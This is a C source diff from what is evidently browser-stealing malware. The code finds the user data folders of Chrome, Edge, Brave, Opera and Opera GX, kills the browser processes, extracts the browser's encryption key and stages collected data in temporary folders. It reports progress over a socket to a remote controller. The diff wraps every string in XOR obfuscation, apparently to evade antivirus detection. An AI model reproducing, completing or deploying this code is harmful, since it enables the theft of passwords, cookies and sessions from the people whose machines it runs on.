@@ -35,39 +35,39 @@ typedef struct {
 
 static BrowserConfig configs[] = {
     {
-        "Chrome", "chrome.exe",
-        {"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL},
-        "chrome.dll",
-        {"Google", "Chrome", "User Data", NULL},
-        "chrome_collect", "chrome_tmp", 0, 0, 1
+        _S("Chrome"), _S("chrome.exe"),
+        {_S("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"), _S("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"), NULL},
+        _S("chrome.dll"),
+        {_S("Google"), _S("Chrome"), _S("User Data"), NULL},
+        _S("chrome_collect"), _S("chrome_tmp"), 0, 0, 1
     },
     {
-        "Edge", "msedge.exe",
-        {"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", NULL},
-        "msedge.dll",
-        {"Microsoft", "Edge", "User Data", NULL},
-        "edge_collect", "edge_tmp", 1, 0, 1
+        _S("Edge"), _S("msedge.exe"),
+        {_S("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"), _S("C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"), NULL},
+        _S("msedge.dll"),
+        {_S("Microsoft"), _S("Edge"), _S("User Data"), NULL},
+        _S("edge_collect"), _S("edge_tmp"), 1, 0, 1
     },
     {
-        "Brave", "brave.exe",
-        {"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", NULL},
-        "chrome.dll",
-        {"BraveSoftware", "Brave-Browser", "User Data", NULL},
-        "brave_collect", "brave_tmp", 0, 0, 1
+        _S("Brave"), _S("brave.exe"),
+        {_S("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"), _S("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"), NULL},
+        _S("chrome.dll"),
+        {_S("BraveSoftware"), _S("Brave-Browser"), _S("User Data"), NULL},
+        _S("brave_collect"), _S("brave_tmp"), 0, 0, 1
     },
     {
-        "Opera", "opera.exe",
-        {NULL, "C:\\Program Files\\Opera\\launcher.exe", "C:\\Program Files (x86)\\Opera\\launcher.exe", NULL},
-        "launcher_lib.dll",
-        {"Opera Software", "Opera Stable", NULL},
-        "opera_collect", "opera_tmp", 0, 1, 0
+        _S("Opera"), _S("opera.exe"),
+        {NULL, _S("C:\\Program Files\\Opera\\launcher.exe"), _S("C:\\Program Files (x86)\\Opera\\launcher.exe"), NULL},
+        _S("launcher_lib.dll"),
+        {_S("Opera Software"), _S("Opera Stable"), NULL},
+        _S("opera_collect"), _S("opera_tmp"), 0, 1, 0
     },
     {
-        "Operagx", "opera.exe",
-        {NULL, "C:\\Program Files\\Opera GX\\launcher.exe", "C:\\Program Files (x86)\\Opera GX\\launcher.exe", NULL},
-        "launcher_lib.dll",
-        {"Opera Software", "Opera GX Stable", NULL},
-        "operagx_collect", "operagx_tmp", 0, 1, 0
+        _S("Operagx"), _S("opera.exe"),
+        {NULL, _S("C:\\Program Files\\Opera GX\\launcher.exe"), _S("C:\\Program Files (x86)\\Opera GX\\launcher.exe"), NULL},
+        _S("launcher_lib.dll"),
+        {_S("Opera Software"), _S("Opera GX Stable"), NULL},
+        _S("operagx_collect"), _S("operagx_tmp"), 0, 1, 0
     },
     {NULL}
 };
@@ -635,64 +635,64 @@ static void finish_collection(const BrowserConfig* config, const char* extract_d
 void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     BrowserConfig* config = NULL;
     for (int i = 0; configs[i].name != NULL; i++) {
-        if (_stricmp(configs[i].name, browser_name) == 0) { config = &configs[i]; break; }
+        if (_stricmp(xor_str(configs[i].name), browser_name) == 0) { config = &configs[i]; break; }
     }
-    if (!config) { sock_send(sock, mutex, "[browser_zip_err]Unknown browser"); return; }
+    if (!config) { sock_send(sock, mutex, xor_str(_S("[browser_zip_err]Unknown browser"))); return; }
 
     char user_data[MAX_PATH] = { 0 };
     char appdata_env[MAX_PATH];
-    if (config->use_roaming) GetEnvironmentVariableA("APPDATA", appdata_env, MAX_PATH);
-    else GetEnvironmentVariableA("LOCALAPPDATA", appdata_env, MAX_PATH);
+    if (config->use_roaming) GetEnvironmentVariableA(xor_str(_S("APPDATA")), appdata_env, MAX_PATH);
+    else GetEnvironmentVariableA(xor_str(_S("LOCALAPPDATA")), appdata_env, MAX_PATH);
 
     strcpy(user_data, appdata_env);
     for(int i=0; config->user_data_subdir[i]; i++) {
-        strcat(user_data, "\\");
-        strcat(user_data, config->user_data_subdir[i]);
+        strcat(user_data, xor_str(_S("\\")));
+        strcat(user_data, xor_str(config->user_data_subdir[i]));
     }
 
     if (!PathFileExistsA(user_data)) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s user data not found", config->name);
+        sprintf(msg, xor_str(_S("[browser_zip_err]%s user data not found")), xor_str(config->name));
         sock_send(sock, mutex, msg);
         return;
     }
 
     const char* exe_path = NULL;
     char custom_opera_path[MAX_PATH];
-    if (strstr(config->name, "Opera")) {
+    if (strstr(xor_str(config->name), xor_str(_S("Opera")))) {
         char user_profile[MAX_PATH];
-        GetEnvironmentVariableA("USERPROFILE", user_profile, MAX_PATH);
-        if (strcmp(config->name, "Opera") == 0) {
-            sprintf(custom_opera_path, "%s\\AppData\\Local\\Programs\\Opera\\opera.exe", user_profile);
+        GetEnvironmentVariableA(xor_str(_S("USERPROFILE")), user_profile, MAX_PATH);
+        if (strcmp(xor_str(config->name), xor_str(_S("Opera"))) == 0) {
+            sprintf(custom_opera_path, xor_str(_S("%s\\AppData\\Local\\Programs\\Opera\\opera.exe")), user_profile);
         } else {
-            sprintf(custom_opera_path, "%s\\AppData\\Local\\Programs\\Opera GX\\opera.exe", user_profile);
+            sprintf(custom_opera_path, xor_str(_S("%s\\AppData\\Local\\Programs\\Opera GX\\opera.exe")), user_profile);
         }
         if (PathFileExistsA(custom_opera_path)) exe_path = custom_opera_path;
     }
 
     if (!exe_path) {
         for(int i=0; i<4; i++) {
-            if (config->exe_paths[i] && PathFileExistsA(config->exe_paths[i])) { exe_path = config->exe_paths[i]; break; }
+            if (config->exe_paths[i] && PathFileExistsA(xor_str(config->exe_paths[i]))) { exe_path = xor_str(config->exe_paths[i]); break; }
         }
     }
 
     if (!exe_path) {
         char msg[256];
-        sprintf(msg, "[browser_zip_err]%s exe not found", config->name);
+        sprintf(msg, xor_str(_S("[browser_zip_err]%s exe not found")), xor_str(config->name));
         sock_send(sock, mutex, msg);
         return;
     }
 
-    kill_process(config->process_name);
-    if (strstr(config->name, "Opera")) kill_process("launcher.exe");
+    kill_process(xor_str(config->process_name));
+    if (strstr(xor_str(config->name), xor_str(_S("Opera")))) kill_process(xor_str(_S("launcher.exe")));
 
     DWORD v10_len = 0;
     int is_dpapi = 0;
     BYTE* v10_key = get_v10_key(user_data, &v10_len, &is_dpapi);
-    int is_opera = strstr(config->name, "Opera") != NULL;
+    int is_opera = strstr(xor_str(config->name), xor_str(_S("Opera"))) != NULL;
 
     char extract_root[MAX_PATH];
-    sprintf(extract_root, "%s\\%s_%u", getenv("TEMP"), config->output_dir, GetTickCount());
+    sprintf(extract_root, xor_str(_S("%s\\%s_%u")), getenv(xor_str(_S("TEMP"))), xor_str(config->output_dir), GetTickCount());
     CreateDirectoryA(extract_root, NULL);
 
     if (v10_key && !config->has_abe) {
